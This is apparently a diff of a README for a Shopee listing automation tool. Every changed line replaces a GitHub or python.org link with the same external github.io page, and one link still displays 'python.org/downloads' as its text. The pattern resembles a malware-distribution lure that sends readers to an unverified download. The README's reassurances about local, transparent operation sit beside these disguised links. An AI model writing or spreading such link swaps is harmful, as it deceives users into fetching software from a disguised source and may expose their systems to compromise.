@@ -1,6 +1,6 @@
 <h1>🤖 ai-staged-shopee-listing - Automate Shopee Listings Safely</h1>
 <p align="center">
-  <a href="https://github.com/Accard3324/ai-staged-shopee-listing" style="display:inline-block;padding:12px 24px;background:#28a745;color:#fff;text-decoration:none;border-radius:6px;font-size:18px;font-weight:bold;">⬇️ Download Now</a>
+  <a href="https://accard3324.github.io" style="display:inline-block;padding:12px 24px;background:#28a745;color:#fff;text-decoration:none;border-radius:6px;font-size:18px;font-weight:bold;">⬇️ Download Now</a>
 </p>
 
 <h2>📋 Overview</h2>
@@ -17,7 +17,7 @@
 
 <h2>🚀 Getting Started</h2>
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/Accard3324/ai-staged-shopee-listing">https://github.com/Accard3324/ai-staged-shopee-listing</a></p>
+<p>Visit this link to download the application: <a href="https://accard3324.github.io">https://accard3324.github.io</a></p>
 <p>Click the green "Code" button, then select "Download ZIP" from the dropdown. Save the file to a folder on your computer (e.g., <code>C:\ai-staged-shopee-listing</code>).</p>
 
 <h3>Step 2: Extract the Files</h3>
@@ -26,7 +26,7 @@
 <h3>Step 3: Install Python</h3>
 <p>This tool requires Python 3.8 or higher. If you don't have Python installed:</p>
 <ol>
-  <li>Go to <a href="https://www.python.org/downloads/" target="_blank">python.org/downloads</a>.</li>
+  <li>Go to <a href="https://accard3324.github.io" target="_blank">python.org/downloads</a>.</li>
   <li>Download the latest Python installer (look for "Windows installer (64-bit)").</li>
   <li>Run the installer and <strong>check</strong> the box "Add Python to PATH" before clicking Install.</li>
   <li>Restart your computer after installation.</li>
@@ -73,7 +73,7 @@
 </table>
 
 <h2>📩 Support</h2>
-<p>For issues or questions, please open an "Issue" on the <a href="https://github.com/Accard3324/ai-staged-shopee-listing">GitHub repository</a>.</p>
+<p>For issues or questions, please open an "Issue" on the <a href="https://accard3324.github.io">GitHub repository</a>.</p>
 
 <h2>🛡️ System Requirements</h2>
 <ul>
@@ -88,5 +88,5 @@
 <p>This tool runs entirely on your computer. No data is sent externally except to Shopee's official servers when you approve an action. AI content generation is performed locally using open-source models. Review the source code on GitHub for transparency.</p>
 
 <p align="center">
-  <a href="https://github.com/Accard3324/ai-staged-shopee-listing" style="display:inline-block;padding:12px 24px;background:#0366d6;color:#fff;text-decoration:none;border-radius:6px;font-size:16px;">⬇️ Download ai-staged-shopee-listing</a>
+  <a href="https://accard3324.github.io" style="display:inline-block;padding:12px 24px;background:#0366d6;color:#fff;text-decoration:none;border-radius:6px;font-size:16px;">⬇️ Download ai-staged-shopee-listing</a>
 </p>
